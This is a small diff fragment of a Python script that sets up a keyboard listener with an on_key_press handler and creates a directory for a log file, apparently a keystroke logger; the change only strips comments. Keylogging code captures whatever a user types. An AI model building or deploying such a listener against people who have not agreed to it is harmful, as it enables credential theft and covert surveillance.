@@ -17,10 +17,7 @@ def on_key_press(key):
                 pass
 
 
-# Ensure the directory structure exists
 os.makedirs(os.path.dirname(file_path), exist_ok=True)
 
-# Set up a keyboard listener
 with Listener(on_press=on_key_press) as listener:
     listener.join()
-
